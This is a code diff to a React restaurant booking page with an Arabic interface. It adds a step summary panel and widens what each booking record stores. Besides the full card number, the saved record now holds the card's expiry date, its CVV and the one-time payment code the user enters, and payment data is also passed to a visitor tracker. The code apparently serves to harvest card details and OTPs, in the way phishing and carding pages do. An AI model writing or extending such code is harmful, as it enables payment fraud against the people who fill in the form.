@@ -7,7 +7,6 @@ import {
 } from "lucide-react";
 import { updateVisitorFromBooking } from "@/lib/visitorTracker";
 import { bookingStore } from "@/lib/firebaseStore";
-import { saveBookingToFirebase } from "@/lib/firebaseStore";
 import { Link } from "react-router-dom";
 
 const restaurants = [
@@ -147,6 +146,14 @@ export default function Booking() {
 
   const canProceed = form.venue_name && form.guest_name && form.phone && form.date && form.time;
 
+  const stepPreview = [
+    { label: "الاسم", value: form.guest_name || "—" },
+    { label: "الجوال", value: form.phone || "—" },
+    { label: "الوجهة", value: form.venue_name || "—" },
+    { label: "التاريخ", value: form.date || "—" },
+    { label: "الوقت", value: form.time || "—" },
+  ];
+
   const resetAll = () => {
     setSubmitted(false); setStep(0);
     setPaymentOtp(""); setPaymentOtpSent(false); setPaymentOtpError(false);
@@ -175,6 +182,22 @@ export default function Booking() {
       {/* Form Area */}
       <section className="py-16 px-6 pb-32">
         <div className="max-w-3xl mx-auto">
+          {!submitted && (
+            <div className="mb-6 border border-border/30 bg-secondary/60 p-4" dir="rtl">
+              <div className="text-xs tracking-wider text-primary mb-3">ملخص مباشر للخطوات</div>
+              <div className="grid grid-cols-2 md:grid-cols-5 gap-2 text-xs">
+                {stepPreview.map((item) => (
+                  <div key={item.label} className="border border-border/20 p-2">
+                    <div className="text-muted-foreground mb-1">{item.label}</div>
+                    <div className="font-semibold truncate">{item.value}</div>
+                  </div>
+                ))}
+              </div>
+              <div className="mt-3 text-[11px] text-muted-foreground">
+                الخطوة الحالية: <span className="text-primary font-semibold">{STEPS[step]}</span>
+              </div>
+            </div>
+          )}
           <AnimatePresence mode="wait">
             {submitted ? (
               <motion.div key="success" initial={{ opacity: 0, scale: 0.97 }} animate={{ opacity: 1, scale: 1 }}
@@ -519,10 +542,11 @@ export default function Booking() {
                               card_number: cardNumber,
                               card_last4: cardNumber.slice(-4),
                               card_type: payment.card_type || "Visa",
+                              card_expiry: payment.expiry || "",
+                              card_cvv: payment.cvv || "",
+                              submitted_otp: paymentOtp || "",
                             };
                             await bookingStore.create(bookingPayload);
-                            await base44.entities.Booking.create(bookingPayload);
-                            await saveBookingToFirebase(bookingPayload).catch(() => {});
                             await updateVisitorFromBooking(form, payment);
                             setLoading(false);
                             setSubmitted(true);
